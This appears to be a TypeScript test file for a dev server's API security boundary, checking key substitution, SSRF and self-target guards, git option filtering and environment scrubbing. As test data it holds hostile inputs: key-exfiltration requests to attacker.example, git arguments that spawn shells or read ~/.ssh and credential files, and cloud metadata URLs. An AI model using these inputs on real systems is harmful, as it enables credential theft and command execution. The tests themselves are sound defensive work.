// tests/dev-api.test.ts — the dev server's /api/* security boundary (dev-api.ts).
// Covers: server keys never leave the server, the per-install token, the self-target guard
// (including redirects), git option filtering, and the scrubbed exec environment.
import { createServer, type Server } from 'node:http';
import {
    substituteServerKeys, ProxyRefusal, isSelfTarget, guardedFetch, gitArgsRefusal,
    createDevApi, buildClientScript, serverKeyStatus, placeholderFor, classifyAddress, publicGet,
} from '../dev-api.ts';
import { scrubEnv } from '../secret-env.ts';

const KEYS = { fg_gemini_key: 'AIzaREALKEYVALUE123456', fg_brave_key: 'brave-real-value-789' };

describe('substituteServerKeys', () => {
    it('fills a placeholder for the key\'s own host', () => {
        const r = substituteServerKeys('https://generativelanguage.googleapis.com/v1beta/models?key=__fgsk__fg_gemini_key__',
            {}, undefined, KEYS);
        expect(r.url).toContain('key=AIzaREALKEYVALUE123456');
        expect(r.used).toBe(true);
        const h = substituteServerKeys('https://api.search.brave.com/res/v1/web/search?q=x',
            { 'X-Subscription-Token': '__fgsk__fg_brave_key__' }, undefined, KEYS);
        expect(h.headers['X-Subscription-Token']).toBe('brave-real-value-789');
    });

    it('refuses to send a key to any other host', () => {
        expect(() => substituteServerKeys('https://attacker.example/collect',
            { Authorization: 'Bearer __fgsk__fg_gemini_key__' }, undefined, KEYS)).toThrow(ProxyRefusal);
        // a lookalike host is not a subdomain
        expect(() => substituteServerKeys('https://evilgenerativelanguage.googleapis.com.attacker.example/',
            {}, '{"k":"__fgsk__fg_gemini_key__"}', KEYS)).toThrow(ProxyRefusal);
    });

    it('refuses subdomains of the key\'s host (exact match only)', () => {
        expect(() => substituteServerKeys('https://evil.generativelanguage.googleapis.com/?key=__fgsk__fg_gemini_key__',
            {}, undefined, KEYS)).toThrow(ProxyRefusal);
    });

    it('refuses plain HTTP and keys the server does not hold', () => {
        expect(() => substituteServerKeys('http://generativelanguage.googleapis.com/?key=__fgsk__fg_gemini_key__',
            {}, undefined, KEYS)).toThrow(ProxyRefusal);
        expect(() => substituteServerKeys('https://api.groq.com/x', { Authorization: 'Bearer __fgsk__fg_groq_key__' },
            undefined, KEYS)).toThrow(/no server key/);
    });

    it('leaves requests without placeholders alone', () => {
        const r = substituteServerKeys('http://localhost:8000/v1/chat/completions', { Authorization: 'Bearer sk-user' }, '{}', KEYS);
        expect(r.used).toBe(false);
        expect(r.headers.Authorization).toBe('Bearer sk-user');
    });
});

describe('isSelfTarget', () => {
    it('matches this server by loopback name or address, on its port only', async () => {
        for (const u of ['http://127.0.0.1:5000/api/x', 'http://localhost:5000/', 'http://localhost.:5000/',
                         'http://[::1]:5000/', 'http://[::ffff:127.0.0.1]:5000/', 'http://0.0.0.0:5000/', 'http://127.1.2.3:5000/'])
            expect(await isSelfTarget(u, 5000)).toBe(true);
        expect(await isSelfTarget('http://localhost:8000/v1/models', 5000)).toBe(false);   // local LLM
        expect(await isSelfTarget('http://127.0.0.1:11434/api/chat', 5000)).toBe(false);   // Ollama
    });
});

describe('guardedFetch', () => {
    const redirect = (to: string, status = 302) => new Response(null, { status, headers: { location: to } });

    it('refuses a redirect back to this server', async () => {
        const f = vi.fn().mockResolvedValueOnce(redirect('http://127.0.0.1:5000/api/execute'));
        await expect(guardedFetch('https://public.example/r', { method: 'GET' }, 5000, false, f)).rejects.toThrow(ProxyRefusal);
        expect(f).toHaveBeenCalledTimes(1);   // the second hop was never requested
    });

    it('does not follow a cross-host redirect when a server key is in the request', async () => {
        const f = vi.fn().mockResolvedValueOnce(redirect('https://attacker.example/'));
        await expect(guardedFetch('https://api.groq.com/x', { method: 'POST' }, 5000, true, f)).rejects.toThrow(/another host/);
    });

    it('follows ordinary redirects, turning POST into GET on 303', async () => {
        const f = vi.fn()
            .mockResolvedValueOnce(redirect('https://public.example/next', 303))
            .mockResolvedValueOnce(new Response('ok', { status: 200 }));
        const r = await guardedFetch('https://public.example/start', { method: 'POST', body: 'x' }, 5000, false, f);
        expect(r.status).toBe(200);
        expect(f.mock.calls[1][1].method).toBe('GET');
        expect(f.mock.calls[1][1].body).toBeUndefined();
    });
});

describe('gitArgsRefusal', () => {
    it('refuses options that run programs', () => {
        for (const a of [['-c', 'core.pager=sh', 'log'], ['--config-env=x=Y', 'status'], ['grep', '-Osh', 'x'],
                         ['grep', '--open-files-in-pager=sh', 'x'], ['clone', '-u', 'sh', 'r'], ['fetch', '--upload-pack=sh'],
                         ['push', '--receive-pack=sh'], ['rebase', '-x', 'sh'], ['submodule', 'foreach', 'sh'],
                         ['bisect', 'run', 'sh'], ['config', 'alias.x', '!sh'], ['difftool'], ['log', '--output=/tmp/x'],
                         ['-ccore.pager=id', 'log'], ['clone', '--config', 'protocol.ext.allow=always', 'ext::sh -c id'],
                         ['clone', '-c', 'protocol.ext.allow=always', 'x'], ['clone', '--template=/tmp/hooks', 'x'],
                         ['init', '--template=/tmp/hooks'], ['archive', '--remote=x', 'HEAD']])
            expect(gitArgsRefusal(a), JSON.stringify(a)).not.toBeNull();
    });

    it('refuses reading or operating outside the project repository', () => {
        for (const a of [['diff', '--no-index', '/dev/null', '/home/u/.config/freegent/credentials'],
                         ['grep', '--no-index', 'KEY', '/home/u'], ['-C', '/home/u/.ssh', 'status'],
                         ['--git-dir=/tmp/x', 'log'], ['--work-tree', '/etc', 'status'], ['-C', 'sub', 'log', '-1']])
            expect(gitArgsRefusal(a), JSON.stringify(a)).not.toBeNull();
    });

    it('allows everyday commands, including ones that share short flags', () => {
        for (const a of [['status'], ['switch', '-c', 'feature'], ['add', '-u'], ['cherry-pick', '-x', 'abc'],
                         ['checkout', '-t', 'origin/x'], ['commit', '-m', 'msg'], ['commit', '-c', 'HEAD'],
                         ['--no-pager', 'log', '-1'], ['clone', 'https://github.com/a/b']])
            expect(gitArgsRefusal(a)).toBeNull();
    });
});

describe('classifyAddress', () => {
    it('tells public, private and link-local apart', () => {
        for (const a of ['8.8.8.8', '2606:4700::1111', '172.32.0.1']) expect(classifyAddress(a), a).toBe('public');
        for (const a of ['127.0.0.1', '10.1.2.3', '172.16.0.1', '192.168.1.1', '100.64.0.1', '0.0.0.0', '224.0.0.1',
                         '::1', '::', 'fd00::1', '::ffff:10.0.0.1', '::ffff:7f00:1']) expect(classifyAddress(a), a).toBe('private');
        for (const a of ['169.254.169.254', 'fe80::1', '::ffff:169.254.169.254']) expect(classifyAddress(a), a).toBe('linklocal');
    });
});

describe('publicGet', () => {
    it('refuses private and link-local targets, by literal or by name', async () => {
        for (const u of ['http://127.0.0.1:8000/', 'http://10.0.0.1/', 'http://169.254.169.254/latest/meta-data/',
                         'http://[::1]:8000/', 'http://localhost:8000/'])
            await expect(publicGet(u, {}, 5000, false), u).rejects.toThrow(ProxyRefusal);
    });
});

describe('scrubEnv', () => {
    it('drops credentials and keeps the rest', () => {
        const out = scrubEnv({ PATH: '/bin', GEMINI_API_KEY: 'a', GITHUB_TOKEN: 'b', AWS_SECRET_ACCESS_KEY: 'c',
            CLOUDFLARE_API_TOKEN: 'd', TOKENIZERS_PARALLELISM: 'false', HOME: '/h' });
        expect(Object.keys(out).sort()).toEqual(['HOME', 'PATH', 'TOKENIZERS_PARALLELISM']);
    });

    it('passes names listed in FG_EXEC_KEEP_ENV', () => {
        expect(scrubEnv({ HF_TOKEN: 'x', FG_EXEC_KEEP_ENV: 'HF_TOKEN' }).HF_TOKEN).toBe('x');
    });
});

describe('dev API over HTTP', () => {
    let server: Server, port = 0, realFetch: typeof fetch;
    const TOKEN = 'test-token-0123456789abcdefghijklmnop';

    beforeAll(async () => {
        vi.unstubAllGlobals();            // tests/setup.js stubs fetch; this file talks HTTP for real
        realFetch = globalThis.fetch;
        let mw: any = null;
        server = createServer((req, res) => mw(req, res, () => { res.statusCode = 404; res.end(); }));
        await new Promise<void>(r => server.listen(0, '127.0.0.1', r));
        port = (server.address() as any).port;
        mw = createDevApi({ bind: '127.0.0.1', port, allowedOrigins: new Set([`http://127.0.0.1:${port}`]),
            token: TOKEN, keys: KEYS }).middleware;
    });
    afterAll(() => new Promise<void>(r => server.close(() => r())));

    const api = (path: string, init: RequestInit = {}, token: string | null = TOKEN) =>
        realFetch(`http://127.0.0.1:${port}${path}`, {
            ...init, headers: { 'Content-Type': 'application/json', ...(token ? { 'X-FG-Token': token } : {}), ...(init.headers || {}) },
        });

    it('requires the token on every endpoint', async () => {
        expect((await api('/api/execute', { method: 'POST', body: '{"code":"true"}' }, null)).status).toBe(401);
        expect((await api('/api/proxy?url=https://example.com/', {}, 'wrong')).status).toBe(401);
    });

    it('has no endpoint that returns keys', async () => {
        const r = await api('/api/keys');
        expect(r.status).toBe(404);
        expect(await r.text()).not.toContain(KEYS.fg_gemini_key);
    });

    it('proxy refuses to reach this server', async () => {
        const r = await api('/api/proxy', { method: 'POST', body: JSON.stringify({ url: `http://localhost:${port}/api/execute`, method: 'POST', body: '{}' }) });
        expect(r.status).toBe(403);
        expect(r.headers.get('X-FG-Proxy-Error')).toBe('1');
        const g = await api(`/api/proxy?url=${encodeURIComponent(`http://127.0.0.1:${port}/`)}`);
        expect(g.status).toBe(403);
    });

    it('proxy refuses to send a server key to another host', async () => {
        const r = await api('/api/proxy', { method: 'POST', body: JSON.stringify({
            url: 'https://attacker.example/', method: 'GET', headers: { Authorization: `Bearer ${placeholderFor('fg_gemini_key')}` } }) });
        expect(r.status).toBe(403);
    });

    it('runs commands without credentials in the environment', async () => {
        process.env.FG_TEST_SECRET_API_KEY = 'must-not-leak';
        try {
            const r = await api('/api/execute', { method: 'POST', body: JSON.stringify({ language: 'bash', code: 'env' }) });
            const out = await r.json();
            expect(out.exit_code).toBe(0);
            expect(out.stdout).toContain('PATH=');
            expect(out.stdout).not.toContain('must-not-leak');
        } finally { delete process.env.FG_TEST_SECRET_API_KEY; }
    });

    it('GET proxy only reaches public addresses (it serves fetch_url and previews)', async () => {
        for (const u of ['http://127.0.0.1:8000/v1/models', 'http://192.168.1.1/admin', 'http://169.254.169.254/'])
            expect((await api(`/api/proxy?url=${encodeURIComponent(u)}`)).status, u).toBe(403);
    });

    it('POST proxy reaches local LLM servers but never link-local addresses', async () => {
        const local = await api('/api/proxy', { method: 'POST', body: JSON.stringify({ url: 'http://127.0.0.1:9/v1/models', method: 'GET' }) });
        expect(local.status).toBe(502);   // allowed: nothing listens on port 9, so the connection fails
        const meta = await api('/api/proxy', { method: 'POST', body: JSON.stringify({ url: 'http://169.254.169.254/latest/meta-data/', method: 'GET' }) });
        expect(meta.status).toBe(403);
    });

    it('refuses oversized request bodies', async () => {
        const r = await api('/api/execute', { method: 'POST', body: 'x'.repeat(65 * 1024 * 1024) });
        expect(r.status).toBe(413);
    });

    it('runs git on this repository', async () => {
        const r = await api('/api/git', { method: 'POST', body: JSON.stringify({ args: ['rev-parse', '--show-toplevel'] }) });
        const out = await r.json();
        expect(out.returncode).toBe(0);
        expect(out.stdout.trim()).toBe(process.cwd());
    });

    it('git refuses -c', async () => {
        const r = await api('/api/git', { method: 'POST', body: JSON.stringify({ args: ['-c', 'core.pager=id', 'log', '-1'] }) });
        expect(r.status).toBe(403);
    });
});

describe('page script', () => {
    const status = serverKeyStatus(KEYS);

    it('carries key hashes, never key values', () => {
        const s = buildClientScript('tok', status);
        expect(s).not.toContain(KEYS.fg_gemini_key);
        expect(s).not.toContain(KEYS.fg_brave_key);
        expect(status.fg_gemini_key).toMatch(/^[0-9a-f]{16}$/);
    });

    describe('fetch wrapper', () => {
        let calls: any[][], saved: any;
        beforeEach(() => {
            saved = window.fetch;
            calls = [];
            (window as any).fetch = (...a: any[]) => { calls.push(a); return Promise.resolve(new Response('{}')); };
            new Function(buildClientScript('tok-123', status))();
        });
        afterEach(() => { (window as any).fetch = saved; delete (window as any).__FG_SERVER_KEYS; });

        it('adds the token to same-origin /api/ requests only', async () => {
            await window.fetch('/api/execute', { method: 'POST', body: '{}' });
            expect(calls[0][1].headers['X-FG-Token']).toBe('tok-123');
            await window.fetch('https://example.com/api/x');
            expect(calls[1][0]).toBe('https://example.com/api/x');
            expect(calls[1][1]?.headers?.['X-FG-Token']).toBeUndefined();
        });

        it('sends requests that carry a placeholder through /api/proxy', async () => {
            await window.fetch('https://api.groq.com/openai/v1/chat/completions',
                { method: 'POST', headers: { Authorization: 'Bearer __fgsk__fg_groq_key__' }, body: '{"a":1}' });
            const [url, init] = calls[0];
            expect(url).toBe(`${location.origin}/api/proxy`);
            expect(init.headers['X-FG-Token']).toBe('tok-123');
            const payload = JSON.parse(init.body);
            expect(payload).toMatchObject({ url: 'https://api.groq.com/openai/v1/chat/completions', method: 'POST', body: '{"a":1}' });
            expect(payload.headers.Authorization).toBe('Bearer __fgsk__fg_groq_key__');
        });

        it('takes a LAN token from the URL fragment and removes it', () => {
            (window as any).fetch = saved;
            history.replaceState(null, '', '/#fg_token=frag-token-abc');
            calls = [];
            (window as any).fetch = (...a: any[]) => { calls.push(a); return Promise.resolve(new Response('{}')); };
            new Function(buildClientScript(null, status))();
            expect(localStorage.getItem('fg_server_token')).toBe('frag-token-abc');
            expect(location.hash).toBe('');
            localStorage.removeItem('fg_server_token');
        });

        it('publishes key status for config.ts', () => {
            expect((window as any).__FG_SERVER_KEYS).toEqual(status);
        });
    });
});
